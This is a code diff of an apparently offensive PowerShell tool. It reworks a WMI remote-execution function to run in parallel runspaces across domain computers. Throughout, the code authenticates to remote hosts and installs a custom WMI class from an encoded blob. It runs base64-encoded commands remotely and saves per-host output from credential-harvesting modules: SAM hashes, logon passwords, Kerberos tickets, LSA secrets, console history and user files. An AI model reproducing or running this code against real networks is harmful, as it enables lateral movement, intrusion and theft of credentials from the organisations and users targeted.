@@ -1132,72 +1132,53 @@ $OSLength = ($computers | ForEach-Object { $_.Properties["operatingSystem"][0].L
 ################################################ Function: WMI #################################################
 ################################################################################################################
 Function Method-WMIexec {
-
-$ErrorActionPreference = "SilentlyContinue"
-Write-Host
-Write-Host
-
-$MaxConcurrentJobs = $Threads
-$WMIJobs = @()
-    Foreach ($Computer in $Computers){
-    $OS = $computer.Properties["operatingSystem"][0]
-    $ComputerName = $computer.Properties["dnshostname"][0]
-        $ScriptBlock = {
-            Param($Option, $Computer, $Domain, $Command, $Module, $CheckAdmin ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $Class, $eKeys, $OS, $ComputerName, $NameLength, $OSLength, $LSA, $LocalAuth, $Password, $Username, $SuccessOnly, $KerbDump, $MimiTickets, $ShowOutput, $ConsoleHistory, $UserFiles)
-            $Class = "PMEClass"
-
-    $tcpClient = New-Object System.Net.Sockets.TcpClient -ErrorAction SilentlyContinue
-	$asyncResult = $tcpClient.BeginConnect($ComputerName, 135, $null, $null)
-	$wait = $asyncResult.AsyncWaitHandle.WaitOne(1000)
-	IF ($wait){ 
-		   try{$tcpClient.EndConnect($asyncResult)
-		   $tcpClient.Close()}Catch{}
+$runspacePool = [runspacefactory]::CreateRunspacePool(1, [Environment]::ProcessorCount)
+$runspacePool.Open()
+$runspaces = New-Object System.Collections.ArrayList
 
 
-if ($LocalAuth){
+$scriptBlock = {
+    param ($computerName, $Command, $Username, $Password, $LocalAuth)
+
+    Function LocalWMI {
+
+param (
+    [string]$Command = "ipconfig",
+    [string]$Username = "",
+    [string]$Password = "",
+    [string]$ComputerName = "",
+    [switch]$LocalAuth = $true,
+    [string]$Class = "PMEClass"
+)
+
 
 $LocalUsername = "$ComputerName\$UserName"
 $LocalPassword = ConvertTo-SecureString "$Password" -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential($LocalUsername,$LocalPassword)
 
-}
 
 #Check access
 $ErrorActionPreference = "silentlycontinue"
 $osInfo = $null  # Reset $osInfo variable before each iteration
 
-if ($LocalAuth){$osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -Credential $Cred}
-elseif (!$LocalAuth) {$osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName}
+# OSinfo
+$osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -Credential $Cred
 
-
+# If OSinfo true and command empty
 if ($osinfo -and $Command -eq ""){
-
-            Write-Host "WMI " -ForegroundColor "Yellow" -NoNewline
-            Write-Host "   " -NoNewline
-            
-            try {$Ping = New-Object System.Net.NetworkInformation.Ping
-            $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
-            Write-Host ("{0,-16}" -f $IP) -NoNewline}
-            catch { Write-Host ("{0,-16}" -f "") -NoNewline}
-            
-            Write-Host "   " -NoNewline
-            Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
-            Write-Host "   " -NoNewline
-            Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
-            Write-Host "   " -NoNewline
-            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
-            Write-Host "SUCCESS "
-
+$result =  "Reminder to move this outside of runspace"
+return $result
 
 }
 
+# If OSinfo true and command not empty
 elseif ($osinfo -and $Command -ne ""){
 
 if ($LocalAuth){	
 	function CreateScriptInstance([string]$ComputerName, [System.Management.Automation.PSCredential]$cred, [string]$Class, [bool]$LocalAuth) {
     $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2" -Credential $cred
     
-    if (!$classCheck) {
+    if (!$classCheck) {Write-Host "ClassCheck"
 $Code = "CgAgACAAIAAgACQAbgBlAHcAQwBsAGEAcwBzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBNAGEAbgBhAGcAZQBtAGUAbgB0AEMAbABhAHMAcwAoACIAXABcACQAZQBuAHYAOgBjAG8AbQBwAHUAdABlAHIAbgBhAG0AZQBcAHIAbwBvAHQAXABjAGkAbQB2ADIAIgAsAFsAcw
 B0AHIAaQBuAGcAXQA6ADoARQBtAHAAdAB5ACwAJABuAHUAbABsACkACgAgACAAIAAgACQAbgBlAHcAQwBsAGEAcwBzAFsAIgBfAF8AQwBMAEEAUwBTACIAXQAgAD0AIAAiAFAATQBFAEMAbABhAHMAcwAiAAoAIAAgACAAIAAkAG4AZQB3AEMAbABhAHMAcwAuAFEAdQBhAGwAaQBmAGkAZQByAHMALgBBAGQAZAAoACIAUwB0AGEAdABpAGMAIgAs
 ACQAdAByAHUAZQApAAoAIAAgACAAIAAkAG4AZQB3AEMAbABhAHMAcwAuAFAAcgBvAHAAZQByAHQAaQBlAHMALgBBAGQAZAAoACIAQwBvAG0AbQBhAG4AZABJAGQAIgAsAFsAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQwBpAG0AVAB5AHAAZQBdADoAOgBTAHQAcgBpAG4AZwAsACQAZgBhAGwAcwBlACkACgAgACAAIAAgAC
@@ -1276,9 +1257,45 @@ if ($scriptCommandId -eq $null) {
 $encodedCommand = "`$result = Invoke-Command -ScriptBlock {$commandString} | Out-String; Get-WmiObject -Class $Class -Filter `"CommandId = '$scriptCommandId'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null"
 $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($encodedCommand))
 $result = ExecCommand $ComputerName $encodedCommand $Cred $Class $LocalAuth
+return $result
 }
 
-if (!$LocalAuth){
+
+
+if ($LocalAuth){
+$wmiClass = Get-WmiObject -Class $Class -ComputerName $ComputerName -Namespace "root\cimv2"  -Credential $cred
+Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName  -Credential $cred
+}
+
+elseif (!$LocalAuth){
+$wmiClass = Get-WmiObject -Class $Class -ComputerName $ComputerName -Namespace "root\cimv2"
+Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName
+}
+
+
+}
+
+elseif (!$osinfo){
+    if ($SuccessOnly){return} 
+        elseif (!$SuccessOnly) {
+
+               return "Access Denied"
+            }
+        }
+}
+    if ($LocalAuth) {return LocalWMI -Username $Username -Password $Password -ComputerName $computerName -Command $Command}
+    
+
+    # Start non-local WMI
+        Function WMI {
+
+param (
+  [string]$Command,
+  [string]$ComputerName,
+  [string]$Class = "PMEClass"
+)
+
+
 function CreateScriptInstance([string]$ComputerName) {
         $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2"
         if ($classCheck -eq $null) {
@@ -1328,7 +1345,7 @@ function GetScriptOutput([string]$ComputerName, [string]$CommandId) {
         }
     }
 
-    $commandString = $Using:Command
+    $commandString = $Command
     $scriptCommandId = CreateScriptInstance $ComputerName
     if ($scriptCommandId -eq $null) {
         Write-Error "Error creating remote instance."
@@ -1336,173 +1353,161 @@ function GetScriptOutput([string]$ComputerName, [string]$CommandId) {
     $encodedCommand = "`$result = Invoke-Command -ScriptBlock {$commandString} | Out-String; Get-WmiObject -Class $Class -Filter `"CommandId = '$scriptCommandId'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null"
     $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($encodedCommand))
     $result = ExecCommand $ComputerName $encodedCommand
+    return $result
+    $wmiClass = Get-WmiObject -Class $Class -ComputerName $ComputerName -Namespace "root\cimv2"
+    Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName | Out-Null
+    
+
+}
+    if (!$LocalAuth) {return WMI -ComputerName $computerName -Command $Command}
 
 }
 
-             
-             $Time = (Get-Date).ToString("HH:mm:ss")
-             Write-Host "WMI " -ForegroundColor "Yellow" -NoNewline
-             Write-Host "   " -NoNewline
-             
-             try {$Ping = New-Object System.Net.NetworkInformation.Ping
-             $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
-             Write-Host ("{0,-16}" -f $IP) -NoNewline}
-             catch { Write-Host ("{0,-16}" -f "") -NoNewline}
-             
-             Write-Host "   " -NoNewline
-             Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
-             Write-Host "   " -NoNewline
-             Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
-             Write-Host "   " -NoNewline
-             Write-Host "[+] " -ForegroundColor "Green" -NoNewline
-             Write-Host "SUCCESS "
-             
-             if ($Module -eq "SAM"){
-             if ($ShowOutput){$result | Write-Host; Write-Host}
-             $result | Out-File -FilePath "$SAM\$ComputerName-SAMHashes.txt" -Encoding "ASCII"
-             }
-             
-             elseif (($Module -eq "LogonPasswords") -or ($Module -eq "LogonPasswords" -and $Option -eq "Parse")){
-             if ($ShowOutput){$result | Write-Host; Write-Host}
-             $result | Out-File -FilePath "$LogonPasswords\$ComputerName-RAW.txt" -Encoding "ASCII"
-             }
-             
-             elseif ($Module -eq "Tickets"){
-             if ($ShowOutput){$result | Write-Host; Write-Host}
-             $result | Out-File -FilePath "$MimiTickets\$ComputerName.txt" -Encoding "ASCII"
-             }
+function Display-ComputerStatus {
+    param (
+        [string]$ComputerName,
+        [string]$OS,
+        [System.ConsoleColor]$statusColor = 'White',
+        [string]$statusSymbol = "",
+        [string]$statusText = "",
+        [int]$NameLength,
+        [int]$OSLength
+    )
 
-             elseif ($Module -eq "KerbDump"){
-             if ($ShowOutput){$result | Write-Host; Write-Host}
-             $result | Out-File -FilePath "$KerbDump\$ComputerName.txt" -Encoding "ASCII"
-             }
-             
-             elseif ($Module -eq "ekeys" -and $Option -ne "Parse"){
-             if ($ShowOutput){$result | Write-Host; Write-Host}
-             $result | Out-File -FilePath "$eKeys\$ComputerName-eKeys.txt" -Encoding "ASCII"
-             }
-             
-             elseif ($Module -eq "ekeys" -and $Option -eq "Parse"){
-             if ($ShowOutput){$result | Write-Host; Write-Host}
-             $result | Out-File -FilePath "$eKeys\$ComputerName-eKeys.txt" -Encoding "ASCII"
-             }
+    # Prefix "WMI"
+    Write-Host "WMI " -ForegroundColor Yellow -NoNewline
+    Write-Host "   " -NoNewline
 
-             elseif ($Module -eq "lsa"){
-             if ($ShowOutput){$result | Write-Host; Write-Host}
-             $result | Out-File -FilePath "$LSA\$ComputerName-LSA.txt" -Encoding "ASCII"
-             }
+    # Attempt to resolve the IP address
+    $IP = $null
+    try {
+        $Ping = New-Object System.Net.NetworkInformation.Ping
+        $IP = $($Ping.Send($ComputerName).Address).IPAddressToString
+        Write-Host ("{0,-16}" -f $IP) -NoNewline
+    } catch {
+        Write-Host ("{0,-16}" -f "") -NoNewline
+    }
 
-             elseif ($Module -eq "ConsoleHistory"){
-             if ($ShowOutput){$result | Write-Host; Write-Host}
-             $result | Out-File -FilePath "$ConsoleHistory\$ComputerName-ConsoleHistory.txt" -Encoding "ASCII"
-             }
+    # Display ComputerName and OS
+    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
+    Write-Host "   " -NoNewline
+    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
+    Write-Host "   " -NoNewline
 
-             elseif ($Module -eq "Files") {
-                if ($ShowOutput -and $result -like "*-*") {
-                    $result | Write-Host
-                }
-                if ($result -like "*-*") {
-                    $result | Out-File -FilePath "$UserFiles\$ComputerName-UserFiles.txt" -Encoding "ASCII"
-                    }
-                }
-             
-             elseif ($Commmand -ne ""){
-             $result | Write-host
-             }
-
-
-if ($LocalAuth){
-$wmiClass = Get-WmiObject -Class $Class -ComputerName $ComputerName -Namespace "root\cimv2"  -Credential $cred
-Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName  -Credential $cred | Out-Null
+    # Display status symbol and text
+    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
+    Write-Host $statusText
 }
 
-elseif (!$LocalAuth){
-$wmiClass = Get-WmiObject -Class $Class -ComputerName $ComputerName -Namespace "root\cimv2"
-Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName | Out-Null
-}
+# Create and invoke runspaces for each computer
+# Filter non-candidate systems before wasting processing power on creating runspaces
+foreach ($computer in $computers) {
+    $ComputerName = $computer.Properties["dnshostname"][0]
+    $OS = $computer.Properties["operatingSystem"][0]
 
-$Class = $null
-$LocalAuth = $null
-$Command = $null
-$ComputerName = $null
-$Result = $null
-}
+    $tcpClient = New-Object System.Net.Sockets.TcpClient -ErrorAction SilentlyContinue
+    $asyncResult = $tcpClient.BeginConnect($ComputerName, 135, $null, $null)
+    $wait = $asyncResult.AsyncWaitHandle.WaitOne(1000)
+    
+    if ($wait) { 
+        try {
+            $tcpClient.EndConnect($asyncResult)
+            $tcpClient.Close()
+        } catch {}
 
-elseif (!$osinfo){
-    if ($SuccessOnly){return} 
-        elseif (!$SuccessOnly) {
+        if ($LocalAuth) {
+            $LocalUsername = "$ComputerName\$UserName"
+            $LocalPassword = ConvertTo-SecureString "$Password" -AsPlainText -Force
+            $cred = New-Object System.Management.Automation.PSCredential($LocalUsername, $LocalPassword)
+            $osInfo = $null 
+
+            # OSinfo
+            $osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -Credential $Cred
+            if (!$osInfo) {
+                Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
+                continue
+            }
+            if ($osInfo -and $Command -eq ""){
+                Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+                continue
+            }
+        } 
+        
+        
+        
+        else {
+            $osInfo = $null
+            $osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName
+            if (!$osInfo) {
+                Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
+                continue
+            }
             
-            Write-Host "WMI " -ForegroundColor "Yellow" -NoNewline
-            Write-Host "   " -NoNewline
+            if ($osInfo -and $Command -eq ""){
+                Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+                continue
+            }
+        }
+
+        $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Username).AddArgument($Password).AddArgument($LocalAuth)
+        $runspace.RunspacePool = $runspacePool
+
+        [void]$runspaces.Add([PSCustomObject]@{
+            Runspace = $runspace
+            Handle = $runspace.BeginInvoke()
+            ComputerName = $ComputerName
+            OS = $OS
+            Completed = $false
+        })
+    }
+}
+
+
+
+# Poll the runspaces and display results as they complete
+do {
+    foreach ($runspace in $runspaces | Where-Object {-not $_.Completed}) {
+        if ($runspace.Handle.IsCompleted) {
+            $runspace.Completed = $true
+            $result = $runspace.Runspace.EndInvoke($runspace.Handle)
             
-            try {$Ping = New-Object System.Net.NetworkInformation.Ping
-            $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
-            Write-Host ("{0,-16}" -f $IP) -NoNewline}
-            catch { Write-Host ("{0,-16}" -f "") -NoNewline}
+            if ($result -eq "Access Denied"){
+
+            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
+            continue
+
+}
+            elseif ($result -eq "Unspecified Error"){
+
+            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
+            continue
+
+}
+            elseif ($result) {
             
-            Write-Host "   " -NoNewline
-            Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
-            Write-Host "   " -NoNewline
-            Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
-            Write-Host "   " -NoNewline
-            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-            Write-Host "ACCESS DENIED"
-                
+            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+            $result | Write-Host
+            if ($Module -eq "SAM"){$result | Out-File -FilePath "$SAM\$($runspace.ComputerName)-SAMHashes.txt" -Encoding "ASCII"}
+            if (($Module -eq "LogonPasswords") -or ($Module -eq "LogonPasswords" -and $Option -eq "Parse")){$result | Out-File -FilePath "$LogonPasswords\$($runspace.ComputerName)-RAW.txt" -Encoding "ASCII"}
+            if ($Module -eq "Tickets"){$result | Out-File -FilePath "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" -Encoding "ASCII"}
+            if ($Module -eq "KerbDump"){$result | Out-File -FilePath "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" -Encoding "ASCII"}
+            if ($Module -eq "LSA"){$result | Out-File -FilePath "$LSA\$($runspace.ComputerName)-LSA.txt" -Encoding "ASCII"}
+            if ($Module -eq "ConsoleHistory"){$result | Out-File -FilePath "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" -Encoding "ASCII"}
+            if ($Module -eq "Files"){$result | Out-File -FilePath "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" -Encoding "ASCII"} 
+            
             }
 
         }
     }
-}
-            # Check if the number of currently running jobs is below the maximum limit
-        while (($WMIJobs | Where-Object { $_.State -eq 'Running' }).Count -ge $MaxConcurrentJobs) {
-            Start-Sleep -Milliseconds 500
-        }
+    Start-Sleep -Milliseconds 100
+} while ($runspaces | Where-Object {-not $_.Completed})
 
-        $WMIJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $Option, $Computer, $Domain, $Command, $Module, $CheckAdmin ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $Class, $eKeys, $OS, $ComputerName,  $NameLength, $OSLength, $LSA, $LocalAuth, $Password, $Username, $SuccessOnly, $KerbDump, $MimiTickets, $ShowOutput, $ConsoleHistory, $UserFiles
-        [array]$WMIJobs += $WMIJob
+# Clean up
+$runspacePool.Close()
+$runspacePool.Dispose()
 
-        # Check if the maximum number of concurrent jobs has been reached
-        if ($WMIJobs.Count -ge $MaxConcurrentJobs) {
-            do {
-                # Wait for any job to complete
-                $JobFinished = $null
-                foreach ($Job in $WMIJobs) {
-                    if ($Job.State -eq 'Completed') {
-                        $JobFinished = $Job
-                        break
-                    }
-                }
 
-                if ($JobFinished) {
-                    # Retrieve the job result and remove it from the job list
-                    $Result = Receive-Job -Job $JobFinished
-                    # Process the result as needed
-                    $Result
 
-                    $WMIJobs = $WMIJobs | Where-Object { $_ -ne $JobFinished }
-                    Remove-Job -Job $JobFinished -Force -ErrorAction SilentlyContinue
-                }
-            }
-            until (-not $JobFinished)
-        }
-    }
-
-    # Wait for any remaining jobs to complete
-    $WMIJobs | ForEach-Object {
-        $JobFinished = $_ | Wait-Job -Timeout 100
-
-        if ($JobFinished) {
-            # Retrieve the job result and remove it from the job list
-            $Result = Receive-Job -Job $JobFinished
-            # Process the result as needed
-            $Result
-
-            Remove-Job -Job $JobFinished -Force -ErrorAction SilentlyContinue
-        }
-    }
-
-    # Clean up all remaining jobs
-    $WMIJobs | Remove-Job -Force -ErrorAction SilentlyContinue
 }
 
 ################################################################################################################
@@ -1987,13 +1992,13 @@ do {
             Write-Host
             
             }
-            if ($result -and $Module -eq "SAM"){$result | Out-File -FilePath "$SAM\$ComputerName-SAMHashes.txt" -Encoding "ASCII"}
-            if (($Module -eq "LogonPasswords") -or ($Module -eq "LogonPasswords" -and $Option -eq "Parse")){$result | Out-File -FilePath "$LogonPasswords\$ComputerName-RAW.txt" -Encoding "ASCII"}
-            if ($Module -eq "Tickets"){$result | Out-File -FilePath "$MimiTickets\$ComputerName-Tickets.txt" -Encoding "ASCII"}
-            if ($Module -eq "KerbDump"){$result | Out-File -FilePath "$KerbDump\$ComputerName-Tickets-KerbDump.txt" -Encoding "ASCII"}
-            if ($Module -eq "LSA"){$result | Out-File -FilePath "$LSA\$ComputerName-LSA.txt" -Encoding "ASCII"}
-            if ($Module -eq "ConsoleHistory"){$result | Out-File -FilePath "$ConsoleHistory\$ComputerName-ConsoleHistory.txt" -Encoding "ASCII"}
-            if ($Module -eq "Files"){$result | Out-File -FilePath "$UserFiles\$ComputerName-UserFiles.txt" -Encoding "ASCII"}
+            if ($Module -eq "SAM"){$result | Out-File -FilePath "$SAM\$($runspace.ComputerName)-SAMHashes.txt" -Encoding "ASCII"}
+            if (($Module -eq "LogonPasswords") -or ($Module -eq "LogonPasswords" -and $Option -eq "Parse")){$result | Out-File -FilePath "$LogonPasswords\$($runspace.ComputerName)-RAW.txt" -Encoding "ASCII"}
+            if ($Module -eq "Tickets"){$result | Out-File -FilePath "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" -Encoding "ASCII"}
+            if ($Module -eq "KerbDump"){$result | Out-File -FilePath "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" -Encoding "ASCII"}
+            if ($Module -eq "LSA"){$result | Out-File -FilePath "$LSA\$($runspace.ComputerName)-LSA.txt" -Encoding "ASCII"}
+            if ($Module -eq "ConsoleHistory"){$result | Out-File -FilePath "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" -Encoding "ASCII"}
+            if ($Module -eq "Files"){$result | Out-File -FilePath "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" -Encoding "ASCII"} 
             
             # Check this
             elseif ($Module -eq "Interactive") {Start-Process powershell.exe -ArgumentList '-noexit -Command', "New-PSSession -ComputerName $ComputerName" -ErrorAction "Ignore"}
